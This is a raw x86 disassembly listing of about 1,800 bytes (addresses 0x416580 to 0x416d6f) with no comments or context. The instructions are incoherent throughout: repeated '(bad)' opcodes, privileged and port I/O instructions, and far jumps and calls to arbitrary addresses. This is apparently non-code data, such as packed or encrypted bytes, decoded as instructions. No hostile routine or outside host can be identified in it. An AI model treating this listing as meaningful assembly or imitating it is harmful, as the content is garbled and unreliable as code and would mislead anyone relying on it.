  416580:	push   cs
  416581:	idiv   al
  416583:	jns    0x416586
  416585:	(bad)  
  416587:	add    esp,ebp
  416589:	std    
  41658a:	mov    ah,BYTE PTR [edx]
  41658c:	test   DWORD PTR [edx+ebx*8],ebp
  41658f:	mov    cl,0x40
  416591:	push   ss
  416592:	add    ecx,DWORD PTR [ebp+0x4c1e400d]
  416598:	push   ebp
  416599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41659a:	ds add eax,0x89cb6261
  4165a0:	imul   esp,esi,0xffffffaf
  4165a3:	jb     0x41657c
  4165a5:	add    edi,esi
  4165a7:	sub    dh,al
  4165a9:	mov    al,0x6e
  4165ab:	xchg   ecx,eax
  4165ac:	jmp    0x4165e1
  4165ae:	in     eax,dx
  4165af:	ret    
  4165b0:	sbb    DWORD PTR [esi+ebx*4-0x14],eax
  4165b4:	mov    ah,0x7e
  4165b6:	add    DWORD PTR [ebx-0x1719adc2],eax
  4165bc:	daa    
  4165bd:	iret   
  4165be:	hlt    
  4165bf:	and    ebx,DWORD PTR [edi]
  4165c1:	hlt    
  4165c2:	jb     0x4165a6
  4165c4:	adc    bl,dl
  4165c6:	das    
  4165c7:	xchg   ebx,eax
  4165c8:	scas   al,BYTE PTR es:[edi]
  4165c9:	cs ins DWORD PTR es:[edi],dx
  4165cb:	adc    eax,DWORD PTR [ecx-0x15aa8a3]
  4165d1:	ret    
  4165d2:	xlat   BYTE PTR ds:[ebx]
  4165d3:	jne    0x416570
  4165d5:	in     al,0xf9
  4165d7:	xchg   DWORD PTR [edx],ebp
  4165d9:	fisub  DWORD PTR [eax-0x711a15a9]
  4165df:	inc    esp
  4165e0:	popa   
  4165e1:	inc    ebp
  4165e2:	cmp    BYTE PTR [eax+0x2d],0x79
  4165e6:	out    0x29,eax
  4165e8:	outs   dx,BYTE PTR ds:[esi]
  4165e9:	imul   edx,DWORD PTR [esi+0x34a4e82d],0x31
  4165f0:	mov    edi,0x5157681c
  4165f5:	lgdtd  [ebx]
  4165f8:	mov    dh,0x1e
  4165fa:	and    DWORD PTR [eax+0x21],edx
  4165fd:	sub    BYTE PTR [ebp-0x41],bh
  416600:	cmp    al,0xf6
  416602:	(bad)  
  416603:	push   esi
  416604:	call   0x6277:0x16fdf7d8
  41660b:	jge    0x4165eb
  41660d:	cdq    
  41660e:	lods   al,BYTE PTR ds:[esi]
  41660f:	or     edx,DWORD PTR [edi-0x73]
  416612:	mov    edi,0xfb17e79b
  416617:	ins    DWORD PTR es:[edi],dx
  416618:	or     al,BYTE PTR gs:[eax]
  41661b:	mov    esp,0x6b7e85ab
  416620:	sbb    eax,0x2bcaf474
  416625:	mov    ebx,0x311f76a9
  41662a:	adc    edi,DWORD PTR [ebx+eax*1]
  41662d:	mov    esp,0xfff0b125
  416632:	xlat   BYTE PTR ds:[ebx]
  416633:	push   edx
  416634:	mov    esi,0x249cd5c3
  416639:	mov    esi,0xb0d0846d
  41663e:	mov    ecx,0x7ff79c0
  416643:	mov    edi,eax
  416645:	adc    BYTE PTR [edi+eax*2+0x6f],ch
  416649:	ja     0x41669b
  41664b:	dec    ebx
  41664c:	mov    esp,0xbdc7a4e3
  416651:	in     al,dx
  416652:	dec    ecx
  416653:	idiv   DWORD PTR [eax+0x58]
  416656:	push   0x37704e2e
  41665b:	lea    ebp,[ebx-0x36]
  41665e:	fld    QWORD PTR [esi]
  416660:	daa    
  416661:	adc    BYTE PTR [edi+0x6be242ec],al
  416667:	push   ebp
  416668:	mov    eax,0x13ad21b8
  41666d:	cmp    ah,BYTE PTR [edi-0x10344972]
  416673:	leave  
  416674:	adc    al,dl
  416676:	add    eax,0x382bf513
  41667b:	in     al,dx
  41667c:	jb     0x416685
  41667e:	jmp    0x28f4dbf9
  416683:	cwde   
  416684:	sbb    al,0xac
  416686:	test   al,0xc0
  416688:	mov    esp,0x50a617b4
  41668d:	jne    0x416697
  41668f:	push   ebp
  416690:	stos   DWORD PTR es:[edi],eax
  416691:	in     eax,dx
  416692:	inc    esi
  416693:	xor    BYTE PTR [ecx+esi*1-0x1f],0xbd
  416698:	sub    esi,DWORD PTR [eax+esi*4]
  41669b:	adc    ch,BYTE PTR [ebx]
  41669d:	dec    esi
  41669e:	mov    BYTE PTR [ebx],0xd
  4166a1:	stc    
  4166a2:	inc    esi
  4166a3:	popa   
  4166a4:	and    ah,BYTE PTR [edx+eax*4+0x44]
  4166a8:	addr16 cld 
  4166aa:	and    eax,0x57fa7c78
  4166af:	ret    0xb3d6
  4166b2:	sbb    esi,edi
  4166b4:	adc    BYTE PTR [ecx],bh
  4166b6:	and    BYTE PTR [esi+0x27974420],0xb9
  4166bd:	loope  0x416651
  4166bf:	fistp  DWORD PTR [esp+edx*1-0x53d484c0]
  4166c6:	sti    
  4166c7:	arpl   cx,sp
  4166c9:	mov    ecx,0xacc55131
  4166ce:	cmp    BYTE PTR [ecx+esi*8+0x10df551d],dh
  4166d5:	and    ebp,DWORD PTR ds:0xb232c2b4
  4166db:	loop   0x416700
  4166dd:	dec    ch
  4166df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166e0:	jmp    0x4af9fbb7
  4166e5:	outs   dx,BYTE PTR ds:[esi]
  4166e6:	pusha  
  4166e7:	inc    ebx
  4166e8:	out    0xf2,al
  4166ea:	sbb    eax,0x71ca8b12
  4166ef:	sahf   
  4166f0:	xor    eax,0xee60d602
  4166f5:	push   esi
  4166f6:	les    ebp,FWORD PTR [ebx-0x18]
  4166f9:	mov    bl,0x42
  4166fb:	sbb    BYTE PTR [edi+0x6c94def6],dl
  416701:	cmp    dl,BYTE PTR [eax+edi*8-0x5e]
  416705:	ud1    edi,edx
  416708:	jmp    0x416758
  41670a:	adc    al,0x9e
  41670c:	adc    BYTE PTR [edi-0x6291c898],0x61
  416713:	inc    ebp
  416714:	adc    al,bh
  416716:	out    0x78,eax
  416718:	call   0xd6986132
  41671d:	dec    esp
  41671e:	cdq    
  41671f:	ret    0x8cdc
  416722:	xor    DWORD PTR [edx+0x273f5524],ecx
  416728:	aaa    
  416729:	cdq    
  41672a:	add    BYTE PTR [ebp+0x51],al
  41672d:	pusha  
  41672e:	or     al,0x9c
  416730:	or     DWORD PTR [ecx],edx
  416732:	mov    esi,ds
  416734:	and    DWORD PTR [esi+0x7ba9b666],0x908b2c70
  41673e:	pop    ebp
  41673f:	loope  0x416703
  416741:	lods   al,BYTE PTR ds:[esi]
  416742:	das    
  416743:	cmp    BYTE PTR [eax+0x79],dl
  416746:	jae    0x41679c
  416748:	and    DWORD PTR [ebx],edi
  41674a:	add    bl,bl
  41674c:	dec    edi
  41674d:	adc    al,0x6f
  41674f:	cdq    
  416750:	hlt    
  416751:	outs   dx,BYTE PTR ds:[esi]
  416752:	or     DWORD PTR [ecx],eax
  416754:	retf   0x4152
  416757:	push   0xffffff98
  416759:	dec    edi
  41675a:	in     al,dx
  41675b:	(bad)  
  41675c:	cli    
  41675d:	xor    esp,DWORD PTR [ebx-0x18]
  416760:	jb     0x4166ff
  416762:	scas   eax,DWORD PTR es:[edi]
  416763:	arpl   bx,di
  416765:	es xchg edi,eax
  416767:	daa    
  416768:	fidivr WORD PTR [esi+0x14]
  41676b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41676c:	xchg   ecx,eax
  41676d:	out    0xdf,al
  41676f:	jg     0x41672b
  416771:	xchg   esi,eax
  416772:	bound  ebx,QWORD PTR [esi+eiz*4-0x2df6f5b7]
  416779:	push   es
  41677a:	pop    edi
  41677b:	sub    dh,0x0
  41677e:	div    BYTE PTR [ecx-0x51]
  416781:	(bad)  
  416782:	and    eax,0x7bfc4e2
  416787:	jne    0x4167ad
  416789:	sbb    ecx,esp
  41678b:	in     al,dx
  41678c:	pushf  
  41678d:	fisubr DWORD PTR [edx-0xd]
  416790:	sbb    bh,0x69
  416793:	call   0xa794fb9d
  416798:	mov    esp,ebp
  41679a:	dec    eax
  41679b:	repz scas al,BYTE PTR es:[edi]
  41679d:	add    edx,DWORD PTR [esi]
  41679f:	or     eax,0xbdcc524a
  4167a4:	arpl   sp,dx
  4167a6:	es add eax,0x8af7b347
  4167ac:	jne    0x4167a2
  4167ae:	sbb    BYTE PTR [edi-0xd],0x98
  4167b2:	mov    esp,0x87e2940e
  4167b7:	aad    0xd
  4167b9:	stc    
  4167ba:	daa    
  4167bb:	stc    
  4167bc:	imul   esi,DWORD PTR [eax-0x61f4de06],0xa67cca62
  4167c6:	mov    edx,0x65294df6
  4167cb:	mov    ch,0xa
  4167cd:	jbe    0x4167da
  4167cf:	daa    
  4167d0:	out    0xc5,al
  4167d2:	dec    edx
  4167d3:	out    0xe9,al
  4167d5:	scas   eax,DWORD PTR es:[edi]
  4167d6:	(bad)  
  4167d7:	ficomp DWORD PTR [ebx+0x63]
  4167da:	out    dx,al
  4167db:	shl    BYTE PTR [eax],cl
  4167dd:	enter  0x3b22,0x75
  4167e1:	(bad)  
  4167e2:	(bad)  
  4167e3:	imul   esp,eax,0xffffff8a
  4167e6:	mov    ah,0xfe
  4167e8:	adc    BYTE PTR [ecx],cl
  4167ea:	sub    BYTE PTR [ecx],ah
  4167ec:	(bad)  
  4167ed:	retf   
  4167ee:	pop    es
  4167ef:	ror    edi,1
  4167f1:	jl     0x416788
  4167f3:	pop    ebp
  4167f4:	and    dh,BYTE PTR [edi-0x57]
  4167f7:	inc    edi
  4167f8:	jnp    0x416865
  4167fa:	mov    dh,0x1b
  4167fc:	sub    bh,BYTE PTR [esi]
  4167fe:	cli    
  4167ff:	out    0x65,al
  416801:	xchg   ecx,eax
  416802:	mov    ebp,0x74a8f32c
  416807:	mov    edi,0x366ff13c
  41680c:	xor    DWORD PTR [ebp+0x582bdb55],0xe95a0f68
  416816:	add    al,0xa1
  416818:	inc    esi
  416819:	adc    edi,edx
  41681b:	cmp    edx,ecx
  41681d:	in     al,dx
  41681e:	jo     0x416827
  416820:	mov    ds:0xeeb26e6a,al
  416825:	repnz arpl WORD PTR [esi+0x4b06d4d4],dx
  41682c:	and    BYTE PTR [ebx-0x66],bh
  41682f:	int3   
  416830:	in     eax,0x1b
  416832:	cmp    DWORD PTR [eax+0x2f],edi
  416835:	xchg   esp,eax
  416836:	push   eax
  416837:	mov    ax,ds:0x86a47609
  41683d:	jle    0x416820
  41683f:	dec    ecx
  416840:	data16 fstp QWORD PTR [ecx+0x1e8a610a]
  416847:	xlat   BYTE PTR ds:[ebx]
  416848:	mov    ebx,0x5b25c516
  41684d:	je     0x416809
  41684f:	jns    0x416836
  416851:	(bad)  
  416853:	xor    BYTE PTR [eax+0x56],cl
  416856:	(bad)  
  416857:	in     al,0xf1
  416859:	addr16 addr16 mov esi,0x841aaae5
  416860:	pop    esp
  416861:	jb     0x416873
  416863:	loope  0x416887
  416865:	sbb    al,0x5f
  416867:	inc    ebp
  416868:	dec    ecx
  416869:	lea    edi,[ebx+0x61a25875]
  41686f:	icebp  
  416870:	jb     0x41688b
  416872:	mov    WORD PTR [edx+edx*4+0xfa910a5],es
  416879:	pop    ss
  41687a:	or     al,0x2b
  41687c:	adc    ebx,DWORD PTR [esi]
  41687e:	in     eax,0x77
  416880:	mov    bh,0x62
  416882:	inc    esi
  416883:	leave  
  416884:	repz push edx
  416886:	retf   0xaa24
  416889:	fdivp  st(5),st
  41688b:	or     al,0x32
  41688d:	enter  0x1944,0x82
  416891:	mov    ebp,0xda84007e
  416896:	push   ebp
  416897:	int3   
  416898:	aad    0x14
  41689a:	adc    BYTE PTR [edi],bh
  41689c:	out    dx,eax
  41689d:	loop   0x4168ad
  41689f:	xchg   edx,eax
  4168a0:	fistp  DWORD PTR [ebp+0x28]
  4168a3:	mov    eax,ds:0xc523a584
  4168a8:	xchg   BYTE PTR [eax-0x8],al
  4168ab:	int3   
  4168ac:	test   eax,0x2aa71f33
  4168b1:	sbb    DWORD PTR [edi-0x7a230633],eax
  4168b7:	cld    
  4168b8:	xor    BYTE PTR [esi],al
  4168ba:	test   DWORD PTR [eax-0x72e0879b],0xfea3dbb5
  4168c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168c5:	les    esp,FWORD PTR [edx]
  4168c7:	cmp    ebp,DWORD PTR [edi+eiz*2-0x191acbd7]
  4168ce:	cmp    ebp,DWORD PTR [ecx]
  4168d0:	mov    ?,WORD PTR [esi-0x440dbdee]
  4168d6:	test   eax,0x9dc02e44
  4168db:	shr    DWORD PTR [eax-0x59],0x45
  4168df:	ret    
  4168e0:	enter  0x3c7b,0x71
  4168e4:	jecxz  0x4168a8
  4168e6:	mov    edx,0x5cb13f
  4168eb:	js     0x41689b
  4168ed:	or     ah,dh
  4168ef:	(bad)  
  4168f0:	adc    BYTE PTR [edx+0x73ae88a1],bh
  4168f6:	fidivr WORD PTR [ebp+0x70fbd8f]
  4168fc:	ja     0x4168ed
  4168fe:	call   0x45795945
  416903:	ret    
  416904:	inc    edi
  416905:	adc    BYTE PTR [edx+0x33],0xfa
  416909:	xor    eax,0xfaa23c4d
  41690e:	jl     0x416912
  416910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416911:	xchg   esi,eax
  416912:	jp     0x41696e
  416914:	add    cl,bh
  416916:	mov    dl,0xa0
  416918:	sbb    ebx,DWORD PTR [ebp+eax*1-0x3034065f]
  41691f:	cld    
  416920:	mov    eax,0x9824e40b
  416925:	into   
  416926:	push   ebp
  416927:	call   0x99f15ff7
  41692c:	repnz pop esi
  41692e:	test   DWORD PTR [eax-0x7726486c],esp
  416934:	stc    
  416935:	pop    eax
  416936:	push   ecx
  416937:	out    0x26,eax
  416939:	sbb    bh,bh
  41693b:	(bad)  
  41693c:	adc    al,0xd
  41693e:	lock fisub WORD PTR [ecx+0x641306dd]
  416945:	dec    edi
  416946:	xrelease mov DWORD PTR [ebp-0x7e],eax
  41694a:	sub    bh,BYTE PTR [edi]
  41694c:	or     esp,ecx
  41694e:	out    dx,eax
  41694f:	aaa    
  416950:	xor    DWORD PTR [ebx+0x6e],0x10408976
  416957:	ret    0x7f25
  41695a:	rcr    BYTE PTR [ecx*4-0x6bac6211],0x15
  416962:	mov    fs,WORD PTR [eax-0x6149c10]
  416968:	outs   dx,BYTE PTR ds:[esi]
  416969:	(bad)  
  41696a:	call   0xc9f2:0x4a444de8
  416971:	bound  eax,QWORD PTR [eax+0x165915ab]
  416977:	jle    0x416991
  416979:	cmp    DWORD PTR [esi-0x2a],0xffffffb4
  41697d:	(bad)  
  41697e:	rcl    BYTE PTR [edx-0x69],0x4a
  416982:	push   ecx
  416983:	push   ebx
  416984:	mov    ecx,0x53b5615b
  416989:	mov    ah,0x14
  41698b:	test   BYTE PTR [eax],0x22
  41698e:	or     BYTE PTR [esi-0x64],0x96
  416992:	call   0x2abfa4bb
  416997:	das    
  416998:	mov    cl,0xc1
  41699a:	cmp    eax,0x70c63ba1
  41699f:	mov    al,ds:0x7b749f10
  4169a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169a5:	outs   dx,DWORD PTR ds:[esi]
  4169a6:	adc    esp,DWORD PTR [esi+0x3b78c73c]
  4169ac:	add    al,0xee
  4169ae:	dec    ebp
  4169af:	cmp    al,0x3a
  4169b1:	cdq    
  4169b2:	shl    bl,1
  4169b4:	mov    cl,0xdf
  4169b6:	fcom   DWORD PTR [ecx]
  4169b8:	adc    BYTE PTR [ecx-0x31543385],0x43
  4169bf:	call   0xc20658a
  4169c4:	push   esi
  4169c5:	jmp    0x3839333d
  4169ca:	ds pop ebx
  4169cc:	mov    cl,0xc9
  4169ce:	stc    
  4169cf:	int3   
  4169d0:	cs mov ebp,ebx
  4169d3:	jle    0x416a35
  4169d5:	fst    DWORD PTR [ebp+0xa4ee5e8]
  4169db:	adc    BYTE PTR [ebx+ecx*8-0x69c96c6a],bl
  4169e2:	ret    
  4169e3:	cwde   
  4169e4:	test   edi,0xecca9251
  4169ea:	jo     0x4169b8
  4169ec:	push   es
  4169ed:	pop    edi
  4169ee:	dec    edx
  4169ef:	mov    esp,0x906966a3
  4169f4:	sub    al,0xdd
  4169f6:	jnp    0x4169a0
  4169f8:	loopne 0x4169d9
  4169fa:	xchg   esi,eax
  4169fb:	iret   
  4169fc:	sbb    DWORD PTR [eax],edi
  4169fe:	mov    ebp,0xd06e6c5a
  416a03:	push   ss
  416a04:	adc    DWORD PTR [edx+edx*8-0xcd69cec],ecx
  416a0b:	push   0xffffffcd
  416a0d:	xor    DWORD PTR [ebx-0x1c4a40d4],ebx
  416a13:	lods   eax,DWORD PTR ds:[esi]
  416a14:	jb     0x4169c8
  416a16:	xchg   ebx,eax
  416a17:	repz xchg ecx,eax
  416a19:	sub    edi,DWORD PTR [ebp-0x10be96ad]
  416a1f:	shl    BYTE PTR [edx+0x12],0xb4
  416a23:	and    edx,DWORD PTR [ebx]
  416a25:	icebp  
  416a26:	arpl   WORD PTR [edi],di
  416a28:	fstp   QWORD PTR [ebx-0x3b]
  416a2b:	icebp  
  416a2c:	jnp    0x416a69
  416a2e:	or     BYTE PTR ds:0xb0e9750d,dh
  416a34:	lock xor DWORD PTR ss:[bp+di+0x24cb],edx
  416a3b:	imul   edx,eax,0x1d
  416a3e:	pop    eax
  416a3f:	mov    ah,0xcd
  416a41:	xlat   BYTE PTR ds:[ebx]
  416a42:	je     0x416a89
  416a44:	xor    edx,eax
  416a46:	ins    BYTE PTR es:[edi],dx
  416a47:	fld    TBYTE PTR [esi-0xa9d871b]
  416a4d:	xchg   ebx,eax
  416a4e:	push   ds
  416a4f:	sbb    edx,esp
  416a51:	ret    0x852a
  416a54:	xchg   esp,eax
  416a55:	mov    ds:0x4cb584d7,eax
  416a5a:	fwait
  416a5b:	out    dx,eax
  416a5c:	xor    BYTE PTR [esi+esi*8+0x1d],dh
  416a60:	sub    BYTE PTR [edx],bl
  416a62:	sti    
  416a63:	pop    eax
  416a64:	int    0xb8
  416a66:	out    dx,eax
  416a67:	mov    eax,ds:0xc203ba01
  416a6c:	pop    esp
  416a6d:	cmc    
  416a6e:	mov    bl,0xa5
  416a70:	or     DWORD PTR [esi-0x4f],0x54
  416a74:	out    0xd7,eax
  416a76:	mov    cl,0xc3
  416a78:	sar    edi,1
  416a7a:	xchg   edx,eax
  416a7b:	mov    cl,0xcc
  416a7d:	das    
  416a7e:	test   al,0x90
  416a80:	repz xchg edx,eax
  416a82:	outs   dx,BYTE PTR ds:[esi]
  416a83:	xor    ebp,esp
  416a85:	inc    edi
  416a86:	mov    ds:0xe9d972c4,al
  416a8b:	lock mov eax,DWORD PTR [ebx*4-0x2445dbf]
  416a93:	mov    ah,0x8e
  416a95:	cmp    DWORD PTR [ecx-0x2fc6a9e7],0xcdd745ca
  416a9f:	jl     0x416a3d
  416aa1:	mov    cs,WORD PTR [edi*4-0x53ff6195]
  416aa8:	hlt    
  416aa9:	retf   0xa86f
  416aac:	add    ebx,DWORD PTR [ebx]
  416aae:	pop    eax
  416aaf:	sbb    esi,DWORD PTR [edi]
  416ab1:	scas   al,BYTE PTR es:[edi]
  416ab2:	jecxz  0x416aaf
  416ab4:	lods   al,BYTE PTR ds:[esi]
  416ab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ab6:	ja     0x416ae8
  416ab8:	pop    ss
  416ab9:	iret   
  416aba:	cmp    DWORD PTR ds:0x2e3886f8,edx
  416ac0:	ss call 0x35c6:0x8fc7d4a4
  416ac8:	inc    edi
  416ac9:	cmp    DWORD PTR [esi],edx
  416acb:	ins    DWORD PTR es:[edi],dx
  416acc:	add    ch,dh
  416ace:	pushf  
  416acf:	stc    
  416ad0:	ds sbb bl,dl
  416ad3:	sar    cl,0x1f
  416ad6:	sahf   
  416ad7:	lds    esp,FWORD PTR [ecx+0x4f068179]
  416add:	cmp    dl,bh
  416adf:	clc    
  416ae0:	and    BYTE PTR [ebx-0x3fc36759],ch
  416ae6:	adc    al,0x3f
  416ae8:	sbb    esp,DWORD PTR [esi+0x3c]
  416aeb:	xchg   ch,bh
  416aed:	clc    
  416aee:	retf   0xa69e
  416af1:	mov    dl,0x2
  416af3:	cmp    DWORD PTR [ecx-0x1aae2bf8],0x8846be07
  416afd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416afe:	sbb    dl,bl
  416b00:	std    
  416b01:	gs adc eax,0x83810de7
  416b07:	push   cs
  416b08:	add    ah,BYTE PTR [esi+0x2a554f5a]
  416b0e:	out    0x1,eax
  416b10:	pop    edi
  416b11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b12:	outs   dx,BYTE PTR ds:[esi]
  416b13:	aam    0x70
  416b15:	outs   dx,BYTE PTR ds:[si]
  416b17:	push   ebx
  416b18:	aas    
  416b19:	js     0x416aea
  416b1b:	mov    esi,0xef9d99f1
  416b20:	xor    eax,0x6f3521f4
  416b25:	clc    
  416b26:	xchg   edx,eax
  416b27:	test   al,0x62
  416b29:	dec    esi
  416b2a:	xor    dh,0xcc
  416b2d:	jo     0x416af6
  416b2f:	add    BYTE PTR [esi],cl
  416b31:	(bad)  
  416b32:	cld    
  416b33:	pop    ebp
  416b34:	lods   eax,DWORD PTR ds:[esi]
  416b35:	cmp    al,0x1d
  416b37:	jbe    0x416b09
  416b39:	mov    BYTE PTR [eax+0x16a27cd1],ah
  416b3f:	mov    DWORD PTR [esi],esp
  416b41:	aam    0x68
  416b43:	enter  0xcf20,0xb2
  416b47:	jg     0x416b98
  416b49:	loopne 0x416ae3
  416b4b:	pop    ds
  416b4c:	ins    DWORD PTR es:[edi],dx
  416b4d:	(bad)  
  416b4e:	lock or al,0x87
  416b51:	dec    eax
  416b52:	inc    edx
  416b53:	inc    esp
  416b54:	xlat   BYTE PTR ds:[ebx]
  416b55:	jmp    0xb846:0x73119a59
  416b5c:	(bad)  
  416b5d:	or     dh,ch
  416b5f:	or     edi,esi
  416b61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b62:	adc    edi,DWORD PTR [edi-0x59]
  416b65:	pop    ecx
  416b66:	imul   ebp,esp,0x3a
  416b69:	scas   al,BYTE PTR es:[edi]
  416b6a:	jmp    0x416b00
  416b6c:	cwde   
  416b6d:	out    dx,eax
  416b6e:	loop   0x416b56
  416b70:	jmp    0x416ba8
  416b72:	bound  edi,QWORD PTR [ecx-0x4eab49e7]
  416b78:	xchg   DWORD PTR [edx],edx
  416b7a:	lds    eax,FWORD PTR ds:[ecx]
  416b7d:	xlat   BYTE PTR ds:[ebx]
  416b7e:	add    al,0x58
  416b80:	fidiv  WORD PTR [edx+edi*8+0x4a]
  416b84:	cwde   
  416b85:	jmp    0x533f08c3
  416b8a:	je     0x416c03
  416b8c:	es push es
  416b8e:	data16 adc bl,BYTE PTR es:0x2b2ef15
  416b96:	sub    al,0x59
  416b98:	cmp    eax,0x91f64eb0
  416b9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b9e:	sahf   
  416b9f:	mov    bl,0x51
  416ba1:	test   ch,cl
  416ba3:	inc    edx
  416ba4:	mov    esi,0x4a7ccfbf
  416ba9:	mov    ch,0x5d
  416bab:	arpl   WORD PTR [ebx],sp
  416bad:	aas    
  416bae:	cmp    DWORD PTR [eax-0x3a3a2bf1],edx
  416bb4:	call   0x584a8bef
  416bb9:	mov    esi,0xb726c136
  416bbe:	outs   dx,DWORD PTR ds:[esi]
  416bbf:	ja     0x416b44
  416bc1:	jge    0x416b96
  416bc3:	dec    ebp
  416bc4:	cwde   
  416bc5:	ret    0x6320
  416bc8:	fld    QWORD PTR [ebp-0x5996a76e]
  416bce:	and    eax,edi
  416bd0:	cmp    DWORD PTR [ebp-0xcf11e0f],esp
  416bd6:	aam    0x24
  416bd8:	xchg   edx,eax
  416bd9:	jecxz  0x416c36
  416bdb:	out    0x1c,eax
  416bdd:	outs   dx,BYTE PTR ds:[esi]
  416bde:	xchg   DWORD PTR ss:[edi],edi
  416be1:	xor    dl,dh
  416be3:	pop    ss
  416be4:	loop   0x416b9e
  416be6:	hlt    
  416be7:	add    DWORD PTR [ecx-0x58021d6e],ecx
  416bed:	js     0x416bfa
  416bef:	or     BYTE PTR [eax+0x74],ah
  416bf2:	and    al,0xa7
  416bf4:	imul   ebp,DWORD PTR [eax-0x20],0x10
  416bf8:	cmp    dh,BYTE PTR [ebx-0x2a]
  416bfb:	in     al,dx
  416bfc:	jg     0x416ba4
  416bfe:	push   esi
  416bff:	ficomp WORD PTR [edx-0x6a9fbbcd]
  416c05:	test   DWORD PTR [ecx-0x653acdb4],ebx
  416c0b:	adc    eax,0xbb71cf4d
  416c10:	arpl   WORD PTR [ecx+0x6ce015a],bx
  416c16:	mov    eax,ds:0x35350c7a
  416c1b:	sub    al,0xfa
  416c1d:	fwait
  416c1e:	inc    esi
  416c1f:	push   ebp
  416c20:	and    BYTE PTR [ebp+ebx*2-0x74eabb54],0x6b
  416c28:	into   
  416c29:	jp     0x416c63
  416c2b:	loopne 0x416baf
  416c2d:	repnz in al,0x9c
  416c30:	cmp    DWORD PTR [edx],ebx
  416c32:	sub    al,0x1e
  416c34:	fwait
  416c35:	mov    edi,0xe6e3b71f
  416c3a:	shl    BYTE PTR [edi],cl
  416c3c:	push   cs
  416c3d:	add    eax,0x4928c02a
  416c42:	sbb    eax,esi
  416c44:	test   eax,0x2d3fbc72
  416c49:	inc    esp
  416c4a:	mov    ds:0x40862dba,eax
  416c4f:	lahf   
  416c50:	ja     0x416c1b
  416c52:	outs   dx,BYTE PTR ds:[esi]
  416c53:	push   eax
  416c54:	mov    edx,0xcbe6fcbd
  416c59:	scas   al,BYTE PTR es:[edi]
  416c5a:	ds xor al,0xb7
  416c5d:	xchg   esp,eax
  416c5e:	or     eax,0x9fb02a48
  416c63:	outs   dx,DWORD PTR ds:[esi]
  416c64:	dec    eax
  416c65:	xchg   DWORD PTR [edx+0x1e],eax
  416c68:	jbe    0x416c71
  416c6a:	mov    BYTE PTR [ecx+0x10719b83],ah
  416c70:	mov    BYTE PTR [esi+0x29],al
  416c73:	mov    gs,ecx
  416c75:	add    ebx,DWORD PTR [esi-0x6c]
  416c78:	out    0x16,eax
  416c7a:	imul   edi,DWORD PTR [ecx+0x539341fe],0xffffff9f
  416c81:	inc    edi
  416c82:	shr    BYTE PTR [esi],1
  416c84:	leave  
  416c85:	sbb    eax,0xadcdfbd7
  416c8a:	aad    0x8b
  416c8c:	mov    cl,0xf4
  416c8e:	mov    edi,0xf3185936
  416c93:	clc    
  416c94:	das    
  416c95:	lea    ebx,es:[esi+0x254ca04a]
  416c9c:	mov    esp,0xa23be1fb
  416ca1:	clc    
  416ca2:	cmp    DWORD PTR [eax],eax
  416ca4:	jp     0x416d08
  416ca6:	or     DWORD PTR [eax+esi*4-0x7502cef0],edx
  416cad:	popa   
  416cae:	fnstenv [ecx]
  416cb0:	pop    esi
  416cb1:	ret    0xada8
  416cb4:	gs jmp 0x578c7776
  416cba:	paddq  mm1,QWORD PTR [ebx-0x5c]
  416cbe:	ja     0x416c66
  416cc0:	popf   
  416cc1:	xchg   edi,eax
  416cc2:	sti    
  416cc3:	adc    eax,0x47617d05
  416cc8:	ficomp WORD PTR [ecx-0x55401868]
  416cce:	pushf  
  416ccf:	pop    edi
  416cd0:	enter  0xbcc,0xda
  416cd4:	push   es
  416cd5:	pop    edx
  416cd6:	enter  0x95d7,0x9
  416cda:	jno    0x416c6c
  416cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cdd:	mov    bh,0x7e
  416cdf:	push   ebp
  416ce0:	mov    ebp,0x789a7be9
  416ce5:	cs jmp 0x416cfc
  416ce8:	jmp    0xc157:0x197d877e
  416cef:	jae    0x416d41
  416cf1:	and    dl,BYTE PTR [ecx+0x1a]
  416cf4:	lods   al,BYTE PTR ds:[esi]
  416cf5:	out    dx,eax
  416cf6:	pop    ds
  416cf7:	xor    esi,DWORD PTR [ecx+0x3b5c9052]
  416cfd:	push   ebx
  416cfe:	xchg   esi,eax
  416cff:	pop    edi
  416d00:	arpl   di,dx
  416d02:	es sti 
  416d04:	and    BYTE PTR [edi-0x447e041e],bh
  416d0a:	xchg   ecx,eax
  416d0b:	(bad)  
  416d0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d0e:	or     BYTE PTR [esi+0x7fa8ea2],0x21
  416d15:	and    edx,esp
  416d17:	ja     0x416d82
  416d19:	sub    cl,BYTE PTR [ebp-0x5c]
  416d1c:	mov    edx,edx
  416d1e:	mov    ?,WORD PTR [edi]
  416d20:	xor    DWORD PTR [ebp-0x4f],edx
  416d23:	shl    BYTE PTR [esi],cl
  416d25:	sbb    al,0x80
  416d27:	xchg   esp,eax
  416d28:	push   esp
  416d29:	popa   
  416d2a:	mov    ds:0x21ba13d,eax
  416d2f:	popf   
  416d30:	sub    al,0xa6
  416d32:	mov    ch,0x7a
  416d34:	jecxz  0x416cbd
  416d36:	inc    ebx
  416d37:	hlt    
  416d38:	mov    esp,0x6fbd7e1e
  416d3d:	push   0x1a
  416d3f:	retf   
  416d40:	xchg   esi,eax
  416d41:	pop    es
  416d42:	imul   ebp,DWORD PTR [esi+0x3c090834],0xd1c6986e
  416d4c:	push   es
  416d4d:	and    esp,DWORD PTR [edx+0x1a]
  416d50:	daa    
  416d51:	jg     0x416d94
  416d53:	pop    ds
  416d54:	pop    esi
  416d55:	cs fsub st(6),st
  416d58:	pop    ebp
  416d59:	mov    ah,0x7e
  416d5b:	lods   eax,DWORD PTR ds:[esi]
  416d5c:	sbb    al,0x3e
  416d5e:	xchg   ebp,eax
  416d5f:	adc    al,BYTE PTR [edi-0x104e1897]
  416d65:	push   0x2a4fbde3
  416d6a:	add    eax,0xa3b5573b
  416d6f:	xchg   esp,eax
